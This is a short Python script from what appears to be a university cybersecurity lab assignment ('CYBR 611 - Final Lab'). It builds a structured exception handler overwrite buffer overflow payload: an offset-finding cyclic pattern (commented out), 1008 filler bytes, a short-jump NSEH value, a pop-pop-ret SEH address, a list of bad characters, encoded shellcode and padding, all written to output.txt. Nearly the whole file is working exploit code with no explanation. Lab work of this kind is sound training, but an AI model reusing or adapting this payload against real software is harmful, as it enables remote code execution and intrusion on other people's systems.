# script.py
# CYBR 611 - Final Lab
# Kevin Day

#pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
#characters = "\x41" * 2000

other = b"\x41" * 1008

# nseh = "CCCC"
nseh = b"\xEB\x06\x90\x90"

# 0x1001e2e3
seh = b"\xe3\xe2\x01\x10"

# BAD CHARACTERS \x00\x0a\x0d
#shellcode = "\xcc" * 10
shellcode = (b"\xda\xdf\xbe\x6f\x94\x10\x11\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
b"\x31\x31\x77\x18\x03\x77\x18\x83\xef\x93\x76\xe5\xed\x83\xf5"
b"\x06\x0e\x53\x9a\x8f\xeb\x62\x9a\xf4\x78\xd4\x2a\x7e\x2c\xd8"
b"\xc1\xd2\xc5\x6b\xa7\xfa\xea\xdc\x02\xdd\xc5\xdd\x3f\x1d\x47"                                                                                      
b"\x5d\x42\x72\xa7\x5c\x8d\x87\xa6\x99\xf0\x6a\xfa\x72\x7e\xd8"                                                                                      
b"\xeb\xf7\xca\xe1\x80\x4b\xda\x61\x74\x1b\xdd\x40\x2b\x10\x84"                                                                                      
b"\x42\xcd\xf5\xbc\xca\xd5\x1a\xf8\x85\x6e\xe8\x76\x14\xa7\x21"
b"\x76\xbb\x86\x8e\x85\xc5\xcf\x28\x76\xb0\x39\x4b\x0b\xc3\xfd"
b"\x36\xd7\x46\xe6\x90\x9c\xf1\xc2\x21\x70\x67\x80\x2d\x3d\xe3"
b"\xce\x31\xc0\x20\x65\x4d\x49\xc7\xaa\xc4\x09\xec\x6e\x8d\xca"
b"\x8d\x37\x6b\xbc\xb2\x28\xd4\x61\x17\x22\xf8\x76\x2a\x69\x96"
b"\x89\xb8\x17\xd4\x8a\xc2\x17\x48\xe3\xf3\x9c\x07\x74\x0c\x77"
b"\x6c\x8a\x46\xda\xc4\x03\x0f\x8e\x55\x4e\xb0\x64\x99\x77\x33"
b"\x8d\x61\x8c\x2b\xe4\x64\xc8\xeb\x14\x14\x41\x9e\x1a\x8b\x62"
b"\x8b\x78\x4a\xf1\x57\x51\xe9\x71\xfd\xad")

padding = b"D" * (2000 - len(other))

data = other + nseh + seh + shellcode + padding

f = open("output.txt", "wb")
f.write(data)
f.close()